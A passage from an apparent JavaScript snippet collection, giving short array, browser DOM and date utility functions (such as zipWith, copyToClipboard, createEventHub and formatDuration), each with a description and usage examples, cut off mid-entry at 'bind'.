longest subarray in the array, Array.prototype.map() to make each element an array.\nUse Array.prototype.reduce() and Array.prototype.forEach() to map grouped values to individual arrays.\nUse Array.prototype.map() and the spread operator (...) to apply fn to each individual group of elements.\nconst unzipWith = (arr, fn) =>\n  arr\n    .reduce(\n      (acc, val) => (val.forEach((v, i) => acc[i].push(v)), acc),\n      Array.from({\n        length: Math.max(...arr.map(x => x.length))\n      }).map(x => [])\n    )\n    .map(val => fn(...val));\n\nExamples\nunzipWith([[1, 10, 100], [2, 20, 200]], (...args) => args.reduce((acc, v) => acc + v, 0)); // [3, 30, 300]\n\n\u2b06 Back to top\nwithout\nFilters out the elements of an array, that have one of the specified values.\nUse Array.prototype.filter() to create an array excluding(using !Array.includes()) all given values.\n(For a snippet that mutates the original array see pull)\nconst without = (arr, ...args) => arr.filter(v => !args.includes(v));\n\nExamples\nwithout([2, 1, 2, 3], 1, 2); // [3]\n\n\u2b06 Back to top\nxProd\nCreates a new array out of the two supplied by creating each possible pair from the arrays.\nUse Array.prototype.reduce(), Array.prototype.map() and Array.prototype.concat() to produce every possible pair from the elements of the two arrays and save them in an array.\nconst xProd = (a, b) => a.reduce((acc, x) => acc.concat(b.map(y => [x, y])), []);\n\nExamples\nxProd([1, 2], ['a', 'b']); // [[1, 'a'], [1, 'b'], [2, 'a'], [2, 'b']]\n\n\u2b06 Back to top\nzip\nCreates an array of elements, grouped based on the position in the original arrays.\nUse Math.max.apply() to get the longest array in the arguments.\nCreates an array with that length as return value and use Array.from() with a map-function to create an array of grouped elements.\nIf lengths of the argument-arrays vary, undefined is used where no value could be found.\nconst zip = (...arrays) => {\n  const maxLength = Math.max(...arrays.map(x => x.length));\n  return Array.from({ length: maxLength }).map((_, i) => {\n    return Array.from({ length: arrays.length }, (_, k) => arrays[k][i]);\n  });\n};\n\nExamples\nzip(['a', 'b'], [1, 2], [true, false]); // [['a', 1, true], ['b', 2, false]]\nzip(['a'], [1, 2], [true, false]); // [['a', 1, true], [undefined, 2, false]]\n\n\u2b06 Back to top\nzipObject\nGiven an array of valid property identifiers and an array of values, return an object associating the properties to the values.\nSince an object can have undefined values but not undefined property pointers, the array of properties is used to decide the structure of the resulting object using Array.prototype.reduce().\nconst zipObject = (props, values) =>\n  props.reduce((obj, prop, index) => ((obj[prop] = values[index]), obj), {});\n\nExamples\nzipObject(['a', 'b', 'c'], [1, 2]); // {a: 1, b: 2, c: undefined}\nzipObject(['a', 'b'], [1, 2, 3]); // {a: 1, b: 2}\n\n\u2b06 Back to top\nzipWith \nCreates an array of elements, grouped based on the position in the original arrays and using function as the last value to specify how grouped values should be combined.\nCheck if the last argument provided is a function.\nUse Math.max() to get the longest array in the arguments.\nCreates an array with that length as return value and use Array.from() with a map-function to create an array of grouped elements.\nIf lengths of the argument-arrays vary, undefined is used where no value could be found.\nThe function is invoked with the elements of each group (...group).\nconst zipWith = (...array) => {\n  const fn = typeof array[array.length - 1] === 'function' ? array.pop() : undefined;\n  return Array.from(\n    { length: Math.max(...array.map(a => a.length)) },\n    (_, i) => (fn ? fn(...array.map(a => a[i])) : array.map(a => a[i]))\n  );\n};\n\nExamples\nzipWith([1, 2], [10, 20], [100, 200], (a, b, c) => a + b + c); // [111,222]\nzipWith(\n  [1, 2, 3],\n  [10, 20],\n  [100, 200],\n  (a, b, c) => (a != null ? a : 'a') + (b != null ? b : 'b') + (c != null ? c : 'c')\n); // [111, 222, '3bc']\n\n\u2b06 Back to top\n\n\ud83c\udf10 Browser\narrayToHtmlList\nConverts the given array elements into <li> tags and appends them to the list of the given id.\nUse Array.prototype.map(), document.querySelector(), and an anonymous inner closure to create a list of html tags.\nconst arrayToHtmlList = (arr, listID) =>\n  (el => (\n    (el = document.querySelector('#' + listID)),\n    (el.innerHTML += arr.map(item => `<li>${item}</li>`).join(''))\n  ))();\n\nExamples\narrayToHtmlList(['item 1', 'item 2'], 'myListID');\n\n\u2b06 Back to top\nbottomVisible\nReturns true if the bottom of the page is visible, false otherwise.\nUse scrollY, scrollHeight and clientHeight to determine if the bottom of the page is visible.\nconst bottomVisible = () =>\n  document.documentElement.clientHeight + window.scrollY >=\n  (document.documentElement.scrollHeight || document.documentElement.clientHeight);\n\nExamples\nbottomVisible(); // true\n\n\u2b06 Back to top\ncopyToClipboard \n\u26a0\ufe0f NOTICE: The same functionality can be easily implemented by using the new asynchronous Clipboard API, which is still experimental but should be used in the future instead of this snippet. Find out more about it here.\nCopy a string to the clipboard.\nOnly works as a result of user action (i.e. inside a click event listener).\nCreate a new <textarea> element, fill it with the supplied data and add it to the HTML document.\nUse Selection.getRangeAt()to store the selected range (if any).\nUse document.execCommand('copy') to copy to the clipboard.\nRemove the <textarea> element from the HTML document.\nFinally, use Selection().addRange() to recover the original selected range (if any).\nconst copyToClipboard = str => {\n  const el = document.createElement('textarea');\n  el.value = str;\n  el.setAttribute('readonly', '');\n  el.style.position = 'absolute';\n  el.style.left = '-9999px';\n  document.body.appendChild(el);\n  const selected =\n    document.getSelection().rangeCount > 0 ? document.getSelection().getRangeAt(0) : false;\n  el.select();\n  document.execCommand('copy');\n  document.body.removeChild(el);\n  if (selected) {\n    document.getSelection().removeAllRanges();\n    document.getSelection().addRange(selected);\n  }\n};\n\nExamples\ncopyToClipboard('Lorem ipsum'); // 'Lorem ipsum' copied to clipboard.\n\n\u2b06 Back to top\ncounter \nCreates a counter with the specified range, step and duration for the specified selector.\nCheck if step has the proper sign and change it accordingly.\nUse setInterval() in combination with Math.abs() and Math.floor() to calculate the time between each new text draw.\nUse document.querySelector().innerHTML to update the value of the selected element.\nOmit the fourth parameter, step, to use a default step of 1.\nOmit the fifth parameter, duration, to use a default duration of 2000ms.\nconst counter = (selector, start, end, step = 1, duration = 2000) => {\n  let current = start,\n    _step = (end - start) * step < 0 ? -step : step,\n    timer = setInterval(() => {\n      current += _step;\n      document.querySelector(selector).innerHTML = current;\n      if (current >= end) document.querySelector(selector).innerHTML = end;\n      if (current >= end) clearInterval(timer);\n    }, Math.abs(Math.floor(duration / (end - start))));\n  return timer;\n};\n\nExamples\ncounter('#my-id', 1, 1000, 5, 2000); // Creates a 2-second timer for the element with id=\"my-id\"\n\n\u2b06 Back to top\ncreateElement\nCreates an element from a string (without appending it to the document).\nIf the given string contains multiple elements, only the first one will be returned.\nUse document.createElement() to create a new element.\nSet its innerHTML to the string supplied as the argument.\nUse ParentNode.firstElementChild to return the element version of the string.\nconst createElement = str => {\n  const el = document.createElement('div');\n  el.innerHTML = str;\n  return el.firstElementChild;\n};\n\nExamples\nconst el = createElement(\n  `<div class=\"container\">\n    <p>Hello!</p>\n  </div>`\n);\nconsole.log(el.className); // 'container'\n\n\u2b06 Back to top\ncreateEventHub \nCreates a pub/sub (publish\u2013subscribe) event hub with emit, on, and off methods.\nUse Object.create(null) to create an empty hub object that does not inherit properties from Object.prototype.\nFor emit, resolve the array of handlers based on the event argument and then run each one with Array.prototype.forEach() by passing in the data as an argument.\nFor on, create an array for the event if it does not yet exist, then use Array.prototype.push() to add the handler\nto the array.\nFor off, use Array.prototype.findIndex() to find the index of the handler in the event array and remove it using Array.prototype.splice().\nconst createEventHub = () => ({\n  hub: Object.create(null),\n  emit(event, data) {\n    (this.hub[event] || []).forEach(handler => handler(data));\n  },\n  on(event, handler) {\n    if (!this.hub[event]) this.hub[event] = [];\n    this.hub[event].push(handler);\n  },\n  off(event, handler) {\n    const i = (this.hub[event] || []).findIndex(h => h === handler);\n    if (i > -1) this.hub[event].splice(i, 1);\n  }\n});\n\nExamples\nconst handler = data => console.log(data);\nconst hub = createEventHub();\nlet increment = 0;\n\n// Subscribe: listen for different types of events\nhub.on('message', handler);\nhub.on('message', () => console.log('Message event fired'));\nhub.on('increment', () => increment++);\n\n// Publish: emit events to invoke all handlers subscribed to them, passing the data to them as an argument\nhub.emit('message', 'hello world'); // logs 'hello world' and 'Message event fired'\nhub.emit('message', { hello: 'world' }); // logs the object and 'Message event fired'\nhub.emit('increment'); // `increment` variable is now 1\n\n// Unsubscribe: stop a specific handler from listening to the 'message' event\nhub.off('message', handler);\n\n\u2b06 Back to top\ncurrentURL\nReturns the current URL.\nUse window.location.href to get current URL.\nconst currentURL = () => window.location.href;\n\nExamples\ncurrentURL(); // 'https://google.com'\n\n\u2b06 Back to top\ndetectDeviceType\nDetects wether the website is being opened in a mobile device or a desktop/laptop.\nUse a regular expression to test the navigator.userAgent property to figure out if the device is a mobile device or a desktop/laptop.\nconst detectDeviceType = () =>\n  /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)\n    ? 'Mobile'\n    : 'Desktop';\n\nExamples\ndetectDeviceType(); // \"Mobile\" or \"Desktop\"\n\n\u2b06 Back to top\nelementContains\nReturns true if the parent element contains the child element, false otherwise.\nCheck that parent is not the same element as child, use parent.contains(child) to check if the parent element contains the child element.\nconst elementContains = (parent, child) => parent !== child && parent.contains(child);\n\nExamples\nelementContains(document.querySelector('head'), document.querySelector('title')); // true\nelementContains(document.querySelector('body'), document.querySelector('body')); // false\n\n\u2b06 Back to top\nelementIsVisibleInViewport \nReturns true if the element specified is visible in the viewport, false otherwise.\nUse Element.getBoundingClientRect() and the window.inner(Width|Height) values\nto determine if a given element is visible in the viewport.\nOmit the second argument to determine if the element is entirely visible, or specify true to determine if\nit is partially visible.\nconst elementIsVisibleInViewport = (el, partiallyVisible = false) => {\n  const { top, left, bottom, right } = el.getBoundingClientRect();\n  const { innerHeight, innerWidth } = window;\n  return partiallyVisible\n    ? ((top > 0 && top < innerHeight) || (bottom > 0 && bottom < innerHeight)) &&\n        ((left > 0 && left < innerWidth) || (right > 0 && right < innerWidth))\n    : top >= 0 && left >= 0 && bottom <= innerHeight && right <= innerWidth;\n};\n\nExamples\n// e.g. 100x100 viewport and a 10x10px element at position {top: -1, left: 0, bottom: 9, right: 10}\nelementIsVisibleInViewport(el); // false - (not fully visible)\nelementIsVisibleInViewport(el, true); // true - (partially visible)\n\n\u2b06 Back to top\nformToObject\nEncode a set of form elements as an object.\nUse the FormData constructor to convert the HTML form to FormData, Array.from() to convert to an array.\nCollect the object from the array, using Array.prototype.reduce().\nconst formToObject = form =>\n  Array.from(new FormData(form)).reduce(\n    (acc, [key, value]) => ({\n      ...acc,\n      [key]: value\n    }),\n    {}\n  );\n\nExamples\nformToObject(document.querySelector('#form')); // { email: 'test@email.com', name: 'Test Name' }\n\n\u2b06 Back to top\ngetImages\nFetches all images from within an element and puts them into an array\nUse Element.prototype.getElementsByTagName() to fetch all <img> elements inside the provided element, Array.prototype.map() to map every src attribute of their respective <img> element, then create a Set to eliminate duplicates and return the array.\nconst getImages = (el, includeDuplicates = false) => {\n  const images = [...el.getElementsByTagName('img')].map(img => img.getAttribute('src'));\n  return includeDuplicates ? images : [...new Set(images)];\n};\n\nExamples\ngetImages(document, true); // ['image1.jpg', 'image2.png', 'image1.png', '...']\ngetImages(document, false); // ['image1.jpg', 'image2.png', '...']\n\n\u2b06 Back to top\ngetScrollPosition\nReturns the scroll position of the current page.\nUse pageXOffset and pageYOffset if they are defined, otherwise scrollLeft and scrollTop.\nYou can omit el to use a default value of window.\nconst getScrollPosition = (el = window) => ({\n  x: el.pageXOffset !== undefined ? el.pageXOffset : el.scrollLeft,\n  y: el.pageYOffset !== undefined ? el.pageYOffset : el.scrollTop\n});\n\nExamples\ngetScrollPosition(); // {x: 0, y: 200}\n\n\u2b06 Back to top\ngetStyle\nReturns the value of a CSS rule for the specified element.\nUse Window.getComputedStyle() to get the value of the CSS rule for the specified element.\nconst getStyle = (el, ruleName) => getComputedStyle(el)[ruleName];\n\nExamples\ngetStyle(document.querySelector('p'), 'font-size'); // '16px'\n\n\u2b06 Back to top\nhasClass\nReturns true if the element has the specified class, false otherwise.\nUse element.classList.contains() to check if the element has the specified class.\nconst hasClass = (el, className) => el.classList.contains(className);\n\nExamples\nhasClass(document.querySelector('p.special'), 'special'); // true\n\n\u2b06 Back to top\nhashBrowser \nCreates a hash for a value using the SHA-256 algorithm. Returns a promise.\nUse the SubtleCrypto API to create a hash for the given value.\nconst hashBrowser = val =>\n  crypto.subtle.digest('SHA-256', new TextEncoder('utf-8').encode(val)).then(h => {\n    let hexes = [],\n      view = new DataView(h);\n    for (let i = 0; i < view.byteLength; i += 4)\n      hexes.push(('00000000' + view.getUint32(i).toString(16)).slice(-8));\n    return hexes.join('');\n  });\n\nExamples\nhashBrowser(JSON.stringify({ a: 'a', b: [1, 2, 3, 4], foo: { c: 'bar' } })).then(console.log); // '04aa106279f5977f59f9067fa9712afc4aedc6f5862a8defc34552d8c7206393'\n\n\u2b06 Back to top\nhide\nHides all the elements specified.\nUse NodeList.prototype.forEach() to apply display: none to each element specified.\nconst hide = (...el) => [...el].forEach(e => (e.style.display = 'none'));\n\nExamples\nhide(document.querySelectorAll('img')); // Hides all <img> elements on the page\n\n\u2b06 Back to top\nhttpsRedirect\nRedirects the page to HTTPS if its currently in HTTP. Also, pressing the back button doesn't take it back to the HTTP page as its replaced in the history.\nUse location.protocol to get the protocol currently being used. If it's not HTTPS, use location.replace() to replace the existing page with the HTTPS version of the page. Use location.href to get the full address, split it with String.prototype.split() and remove the protocol part of the URL.\nconst httpsRedirect = () => {\n  if (location.protocol !== 'https:') location.replace('https://' + location.href.split('//')[1]);\n};\n\nExamples\nhttpsRedirect(); // If you are on http://mydomain.com, you are redirected to https://mydomain.com\n\n\u2b06 Back to top\ninsertAfter\nInserts an HTML string after the end of the specified element.\nUse el.insertAdjacentHTML() with a position of 'afterend' to parse htmlString and insert it after the end of el.\nconst insertAfter = (el, htmlString) => el.insertAdjacentHTML('afterend', htmlString);\n\nExamples\ninsertAfter(document.getElementById('myId'), '<p>after</p>'); // <div id=\"myId\">...</div> <p>after</p>\n\n\u2b06 Back to top\ninsertBefore\nInserts an HTML string before the start of the specified element.\nUse el.insertAdjacentHTML() with a position of 'beforebegin' to parse htmlString and insert it before the start of el.\nconst insertBefore = (el, htmlString) => el.insertAdjacentHTML('beforebegin', htmlString);\n\nExamples\ninsertBefore(document.getElementById('myId'), '<p>before</p>'); // <p>before</p> <div id=\"myId\">...</div>\n\n\u2b06 Back to top\nisBrowserTabFocused\nReturns true if the browser tab of the page is focused, false otherwise.\nUse the Document.hidden property, introduced by the Page Visibility API to check if the browser tab of the page is visible or hidden.\nconst isBrowserTabFocused = () => !document.hidden;\n\nExamples\nisBrowserTabFocused(); // true\n\n\u2b06 Back to top\nnodeListToArray\nConverts a NodeList to an array.\nUse spread operator inside new array to convert a NodeList to an array.\nconst nodeListToArray = nodeList => [...nodeList];\n\nExamples\nnodeListToArray(document.childNodes); // [ <!DOCTYPE html>, html ]\n\n\u2b06 Back to top\nobserveMutations \nReturns a new MutationObserver and runs the provided callback for each mutation on the specified element.\nUse a MutationObserver to observe mutations on the given element.\nUse Array.prototype.forEach() to run the callback for each mutation that is observed.\nOmit the third argument, options, to use the default options (all true).\nconst observeMutations = (element, callback, options) => {\n  const observer = new MutationObserver(mutations => mutations.forEach(m => callback(m)));\n  observer.observe(\n    element,\n    Object.assign(\n      {\n        childList: true,\n        attributes: true,\n        attributeOldValue: true,\n        characterData: true,\n        characterDataOldValue: true,\n        subtree: true\n      },\n      options\n    )\n  );\n  return observer;\n};\n\nExamples\nconst obs = observeMutations(document, console.log); // Logs all mutations that happen on the page\nobs.disconnect(); // Disconnects the observer and stops logging mutations on the page\n\n\u2b06 Back to top\noff\nRemoves an event listener from an element.\nUse EventTarget.removeEventListener() to remove an event listener from an element.\nOmit the fourth argument opts to use false or specify it based on the options used when the event listener was added.\nconst off = (el, evt, fn, opts = false) => el.removeEventListener(evt, fn, opts);\n\nExamples\nconst fn = () => console.log('!');\ndocument.body.addEventListener('click', fn);\noff(document.body, 'click', fn); // no longer logs '!' upon clicking on the page\n\n\u2b06 Back to top\non\nAdds an event listener to an element with the ability to use event delegation.\nUse EventTarget.addEventListener() to add an event listener to an element. If there is a target property supplied to the options object, ensure the event target matches the target specified and then invoke the callback by supplying the correct this context.\nReturns a reference to the custom delegator function, in order to be possible to use with off.\nOmit opts to default to non-delegation behavior and event bubbling.\nconst on = (el, evt, fn, opts = {}) => {\n  const delegatorFn = e => e.target.matches(opts.target) && fn.call(e.target, e);\n  el.addEventListener(evt, opts.target ? delegatorFn : fn, opts.options || false);\n  if (opts.target) return delegatorFn;\n};\n\nExamples\nconst fn = () => console.log('!');\non(document.body, 'click', fn); // logs '!' upon clicking the body\non(document.body, 'click', fn, { target: 'p' }); // logs '!' upon clicking a `p` element child of the body\non(document.body, 'click', fn, { options: true }); // use capturing instead of bubbling\n\n\u2b06 Back to top\nonUserInputChange \nRun the callback whenever the user input type changes (mouse or touch). Useful for enabling/disabling code depending on the input device. This process is dynamic and works with hybrid devices (e.g. touchscreen laptops).\nUse two event listeners. Assume mouse input initially and bind a touchstart event listener to the document.\nOn touchstart, add a mousemove event listener to listen for two consecutive mousemove events firing within 20ms, using performance.now().\nRun the callback with the input type as an argument in either of these situations.\nconst onUserInputChange = callback => {\n  let type = 'mouse',\n    lastTime = 0;\n  const mousemoveHandler = () => {\n    const now = performance.now();\n    if (now - lastTime < 20)\n      (type = 'mouse'), callback(type), document.removeEventListener('mousemove', mousemoveHandler);\n    lastTime = now;\n  };\n  document.addEventListener('touchstart', () => {\n    if (type === 'touch') return;\n    (type = 'touch'), callback(type), document.addEventListener('mousemove', mousemoveHandler);\n  });\n};\n\nExamples\nonUserInputChange(type => {\n  console.log('The user is now using', type, 'as an input method.');\n});\n\n\u2b06 Back to top\nprefix\nReturns the prefixed version (if necessary) of a CSS property that the browser supports.\nUse Array.prototype.findIndex() on an array of vendor prefix strings to test if document.body has one of them defined in its CSSStyleDeclaration object, otherwise return null.\nUse String.prototype.charAt() and String.prototype.toUpperCase() to capitalize the property, which will be appended to the vendor prefix string.\nconst prefix = prop => {\n  const capitalizedProp = prop.charAt(0).toUpperCase() + prop.slice(1);\n  const prefixes = ['', 'webkit', 'moz', 'ms', 'o'];\n  const i = prefixes.findIndex(\n    prefix => typeof document.body.style[prefix ? prefix + capitalizedProp : prop] !== 'undefined'\n  );\n  return i !== -1 ? (i === 0 ? prop : prefixes[i] + capitalizedProp) : null;\n};\n\nExamples\nprefix('appearance'); // 'appearance' on a supported browser, otherwise 'webkitAppearance', 'mozAppearance', 'msAppearance' or 'oAppearance'\n\n\u2b06 Back to top\nrecordAnimationFrames\nInvokes the provided callback on each animation frame.\nUse recursion.\nProvided that running is true, continue invoking window.requestAnimationFrame() which invokes the provided callback.\nReturn an object with two methods start and stop to allow manual control of the recording.\nOmit the second argument, autoStart, to implicitly call start when the function is invoked.\nconst recordAnimationFrames = (callback, autoStart = true) => {\n  let running = true,\n    raf;\n  const stop = () => {\n    running = false;\n    cancelAnimationFrame(raf);\n  };\n  const start = () => {\n    running = true;\n    run();\n  };\n  const run = () => {\n    raf = requestAnimationFrame(() => {\n      callback();\n      if (running) run();\n    });\n  };\n  if (autoStart) start();\n  return { start, stop };\n};\n\nExamples\nconst cb = () => console.log('Animation frame fired');\nconst recorder = recordAnimationFrames(cb); // logs 'Animation frame fired' on each animation frame\nrecorder.stop(); // stops logging\nrecorder.start(); // starts again\nconst recorder2 = recordAnimationFrames(cb, false); // `start` needs to be explicitly called to begin recording frames\n\n\u2b06 Back to top\nredirect\nRedirects to a specified URL.\nUse window.location.href or window.location.replace() to redirect to url.\nPass a second argument to simulate a link click (true - default) or an HTTP redirect (false).\nconst redirect = (url, asLink = true) =>\n  asLink ? (window.location.href = url) : window.location.replace(url);\n\nExamples\nredirect('https://google.com');\n\n\u2b06 Back to top\nrunAsync \nRuns a function in a separate thread by using a Web Worker, allowing long running functions to not block the UI.\nCreate a new Worker using a Blob object URL, the contents of which should be the stringified version of the supplied function.\nImmediately post the return value of calling the function back.\nReturn a promise, listening for onmessage and onerror events and resolving the data posted back from the worker, or throwing an error.\nconst runAsync = fn => {\n  const worker = new Worker(\n    URL.createObjectURL(new Blob([`postMessage((${fn})());`]), {\n      type: 'application/javascript; charset=utf-8'\n    })\n  );\n  return new Promise((res, rej) => {\n    worker.onmessage = ({ data }) => {\n      res(data), worker.terminate();\n    };\n    worker.onerror = err => {\n      rej(err), worker.terminate();\n    };\n  });\n};\n\nExamples\nconst longRunningFunction = () => {\n  let result = 0;\n  for (let i = 0; i < 1000; i++)\n    for (let j = 0; j < 700; j++) for (let k = 0; k < 300; k++) result = result + i + j + k;\n\n  return result;\n};\n/*\n  NOTE: Since the function is running in a different context, closures are not supported.\n  The function supplied to `runAsync` gets stringified, so everything becomes literal.\n  All variables and functions must be defined inside.\n*/\nrunAsync(longRunningFunction).then(console.log); // 209685000000\nrunAsync(() => 10 ** 3).then(console.log); // 1000\nlet outsideVariable = 50;\nrunAsync(() => typeof outsideVariable).then(console.log); // 'undefined'\n\n\u2b06 Back to top\nscrollToTop\nSmooth-scrolls to the top of the page.\nGet distance from top using document.documentElement.scrollTop or document.body.scrollTop.\nScroll by a fraction of the distance from the top. Use window.requestAnimationFrame() to animate the scrolling.\nconst scrollToTop = () => {\n  const c = document.documentElement.scrollTop || document.body.scrollTop;\n  if (c > 0) {\n    window.requestAnimationFrame(scrollToTop);\n    window.scrollTo(0, c - c / 8);\n  }\n};\n\nExamples\nscrollToTop();\n\n\u2b06 Back to top\nserializeForm\nEncode a set of form elements as a query string.\nUse the FormData constructor to convert the HTML form to FormData, Array.from() to convert to an array, passing a map function as the second argument.\nUse Array.prototype.map() and window.encodeURIComponent() to encode each field's value.\nUse Array.prototype.join() with appropriate argumens to produce an appropriate query string.\nconst serializeForm = form =>\n  Array.from(new FormData(form), field => field.map(encodeURIComponent).join('=')).join('&');\n\nExamples\nserializeForm(document.querySelector('#form')); // email=test%40email.com&name=Test%20Name\n\n\u2b06 Back to top\nsetStyle\nSets the value of a CSS rule for the specified element.\nUse element.style to set the value of the CSS rule for the specified element to val.\nconst setStyle = (el, ruleName, val) => (el.style[ruleName] = val);\n\nExamples\nsetStyle(document.querySelector('p'), 'font-size', '20px'); // The first <p> element on the page will have a font-size of 20px\n\n\u2b06 Back to top\nshow\nShows all the elements specified.\nUse the spread operator (...) and Array.prototype.forEach() to clear the display property for each element specified.\nconst show = (...el) => [...el].forEach(e => (e.style.display = ''));\n\nExamples\nshow(...document.querySelectorAll('img')); // Shows all <img> elements on the page\n\n\u2b06 Back to top\nsmoothScroll\nSmoothly scrolls the element on which it's called into the visible area of the browser window.\nUse .scrollIntoView method to scroll the element.\nPass { behavior: 'smooth' } to .scrollIntoView so it scrolls smoothly.\nconst smoothScroll = element =>\n  document.querySelector(element).scrollIntoView({\n    behavior: 'smooth'\n  });\n\nExamples\nsmoothScroll('#fooBar'); // scrolls smoothly to the element with the id fooBar\nsmoothScroll('.fooBar'); // scrolls smoothly to the first element with a class of fooBar\n\n\u2b06 Back to top\ntoggleClass\nToggle a class for an element.\nUse element.classList.toggle() to toggle the specified class for the element.\nconst toggleClass = (el, className) => el.classList.toggle(className);\n\nExamples\ntoggleClass(document.querySelector('p.special'), 'special'); // The paragraph will not have the 'special' class anymore\n\n\u2b06 Back to top\ntriggerEvent\nTriggers a specific event on a given element, optionally passing custom data.\nUse new CustomEvent() to create an event from the specified eventType and details.\nUse el.dispatchEvent() to trigger the newly created event on the given element.\nOmit the third argument, detail, if you do not want to pass custom data to the triggered event.\nconst triggerEvent = (el, eventType, detail) =>\n  el.dispatchEvent(new CustomEvent(eventType, { detail }));\n\nExamples\ntriggerEvent(document.getElementById('myId'), 'click');\ntriggerEvent(document.getElementById('myId'), 'click', { username: 'bob' });\n\n\u2b06 Back to top\nUUIDGeneratorBrowser\nGenerates a UUID in a browser.\nUse crypto API to generate a UUID, compliant with RFC4122 version 4.\nconst UUIDGeneratorBrowser = () =>\n  ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, c =>\n    (c ^ (crypto.getRandomValues(new Uint8Array(1))[0] & (15 >> (c / 4)))).toString(16)\n  );\n\nExamples\nUUIDGeneratorBrowser(); // '7982fcfe-5721-4632-bede-6000885be57d'\n\n\u2b06 Back to top\n\n\u23f1\ufe0f Date\ndayOfYear\nGets the day of the year from a Date object.\nUse new Date() and Date.prototype.getFullYear() to get the first day of the year as a Date object, subtract it from the provided date and divide with the milliseconds in each day to get the result.\nUse Math.floor() to appropriately round the resulting day count to an integer.\nconst dayOfYear = date =>\n  Math.floor((date - new Date(date.getFullYear(), 0, 0)) / 1000 / 60 / 60 / 24);\n\nExamples\ndayOfYear(new Date()); // 272\n\n\u2b06 Back to top\nformatDuration\nReturns the human readable format of the given number of milliseconds.\nDivide ms with the appropriate values to obtain the appropriate values for day, hour, minute, second and millisecond.\nUse Object.entries() with Array.prototype.filter() to keep only non-zero values.\nUse Array.prototype.map() to create the string for each value, pluralizing appropriately.\nUse String.prototype.join(', ') to combine the values into a string.\nconst formatDuration = ms => {\n  if (ms < 0) ms = -ms;\n  const time = {\n    day: Math.floor(ms / 86400000),\n    hour: Math.floor(ms / 3600000) % 24,\n    minute: Math.floor(ms / 60000) % 60,\n    second: Math.floor(ms / 1000) % 60,\n    millisecond: Math.floor(ms) % 1000\n  };\n  return Object.entries(time)\n    .filter(val => val[1] !== 0)\n    .map(([key, val]) => `${val} ${key}${val !== 1 ? 's' : ''}`)\n    .join(', ');\n};\n\nExamples\nformatDuration(1001); // '1 second, 1 millisecond'\nformatDuration(34325055574); // '397 days, 6 hours, 44 minutes, 15 seconds, 574 milliseconds'\n\n\u2b06 Back to top\ngetColonTimeFromDate\nReturns a string of the form HH:MM:SS from a Date object.\nUse Date.prototype.toTimeString() and String.prototype.slice() to get the HH:MM:SS part of a given Date object.\nconst getColonTimeFromDate = date => date.toTimeString().slice(0, 8);\n\nExamples\ngetColonTimeFromDate(new Date()); // \"08:38:00\"\n\n\u2b06 Back to top\ngetDaysDiffBetweenDates\nReturns the difference (in days) between two dates.\nCalculate the difference (in days) between two Date objects.\nconst getDaysDiffBetweenDates = (dateInitial, dateFinal) =>\n  (dateFinal - dateInitial) / (1000 * 3600 * 24);\n\nExamples\ngetDaysDiffBetweenDates(new Date('2017-12-13'), new Date('2017-12-22')); // 9\n\n\u2b06 Back to top\ngetMeridiemSuffixOfInteger\nConverts an integer to a suffixed string, adding am or pm based on its value.\nUse the modulo operator (%) and conditional checks to transform an integer to a stringified 12-hour format with meridiem suffix.\nconst getMeridiemSuffixOfInteger = num =>\n  num === 0 || num === 24\n    ? 12 + 'am'\n    : num === 12\n      ? 12 + 'pm'\n      : num < 12\n        ? (num % 12) + 'am'\n        : (num % 12) + 'pm';\n\nExamples\ngetMeridiemSuffixOfInteger(0); // \"12am\"\ngetMeridiemSuffixOfInteger(11); // \"11am\"\ngetMeridiemSuffixOfInteger(13); // \"1pm\"\ngetMeridiemSuffixOfInteger(25); // \"1pm\"\n\n\u2b06 Back to top\nisAfterDate\nCheck if a date is after another date.\nUse the greater than operator (>) to check if the first date comes after the second one.\nconst isAfterDate = (dateA, dateB) => dateA > dateB;\n\nExamples\nisAfterDate(new Date(2010, 10, 21), new Date(2010, 10, 20)); // true\n\n\u2b06 Back to top\nisBeforeDate\nCheck if a date is before another date.\nUse the less than operator (<) to check if the first date comes before the second one.\nconst isBeforeDate = (dateA, dateB) => dateA < dateB;\n\nExamples\nisBeforeDate(new Date(2010, 10, 20), new Date(2010, 10, 21)); // true\n\n\u2b06 Back to top\nisSameDate\nCheck if a date is the same as another date.\nUse Date.prototype.toISOString() and strict equality checking (===) to check if the first date is the same as the second one.\nconst isSameDate = (dateA, dateB) => dateA.toISOString() === dateB.toISOString();\n\nExamples\nisSameDate(new Date(2010, 10, 20), new Date(2010, 10, 20)); // true\n\n\u2b06 Back to top\nmaxDate\nReturns the maximum of the given dates.\nUse Math.max.apply() to find the maximum date value, new Date() to convert it to a Date object.\nconst maxDate = (...dates) => new Date(Math.max.apply(null, ...dates));\n\nExamples\nconst array = [\n  new Date(2017, 4, 13),\n  new Date(2018, 2, 12),\n  new Date(2016, 0, 10),\n  new Date(2016, 0, 9)\n];\nmaxDate(array); // 2018-03-11T22:00:00.000Z\n\n\u2b06 Back to top\nminDate\nReturns the minimum of the given dates.\nUse Math.min.apply() to find the minimum date value, new Date() to convert it to a Date object.\nconst minDate = (...dates) => new Date(Math.min.apply(null, ...dates));\n\nExamples\nconst array = [\n  new Date(2017, 4, 13),\n  new Date(2018, 2, 12),\n  new Date(2016, 0, 10),\n  new Date(2016, 0, 9)\n];\nminDate(array); // 2016-01-08T22:00:00.000Z\n\n\u2b06 Back to top\ntomorrow\nResults in a string representation of tomorrow's date.\nUse new Date() to get the current date, increment by one using Date.getDate() and set the value to the result using Date.setDate().\nUse Date.prototype.toISOString() to return a string in yyyy-mm-dd format.\nconst tomorrow = () => {\n  let t = new Date();\n  t.setDate(t.getDate() + 1);\n  return t.toISOString().split('T')[0];\n};\n\nExamples\ntomorrow(); // 2018-10-19 (if current date is 2018-10-18)\n\n\u2b06 Back to top\n\n\ud83c\udf9b\ufe0f Function\nattempt\nAttempts to invoke a function with the provided arguments, returning either the result or the caught error object.\nUse a try... catch block to return either the result of the function or an appropriate error.\nconst attempt = (fn, ...args) => {\n  try {\n    return fn(...args);\n  } catch (e) {\n    return e instanceof Error ? e : new Error(e);\n  }\n};\n\nExamples\nvar elements = attempt(function(selector) {\n  return document.querySelectorAll(selector);\n}, '>_>');\nif (elements instanceof Error) elements = []; // elements = []\n\n\u2b06 Back to top\nbind\nCreates a function that invokes fn with a given context, optionally adding any additional supplied parameters to the beginning of the arguments.\nReturn a function that uses Function.prototype.apply() to apply the given context to fn.\nUse Array.prototype.concat() to prepend any additional supplied parameters to the arguments.\nconst bind = (fn, context, ...boundArgs) => 